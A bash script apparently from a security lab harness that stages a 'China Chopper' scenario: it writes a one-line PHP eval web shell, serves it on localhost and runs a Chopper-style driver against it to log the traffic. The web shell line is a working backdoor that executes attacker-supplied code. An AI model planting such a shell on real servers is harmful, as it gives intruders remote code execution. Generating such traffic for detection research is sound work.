#!/bin/bash
# China Chopper scenario: one-line PHP eval shell + chopper-style driver.
# Each operation is one short POST (Connection: close) with z0=base64 PHP
# eval payload and optional z1=argument; no keep-alive, no heartbeat.
set +e
OUT="${OUT:-/lab/src/out}"
mkdir -p "$OUT" /var/www/cp
echo '<?php @eval(base64_decode($_POST["z0"]));' > /var/www/cp/shell.php

php -S 127.0.0.1:8080 -t /var/www/cp > "$OUT/cp_php.log" 2>&1 &
PHP=$!
sleep 2

python3 /lab/src/framework/drivers/chopper/chopper_driver.py \
  http://127.0.0.1:8080/shell.php > "$OUT/cp_drv.log" 2>&1
RC=$?
kill "$PHP" 2>/dev/null
echo "chopper scenario rc=$RC" >> "$OUT/chopper.log"
exit 0
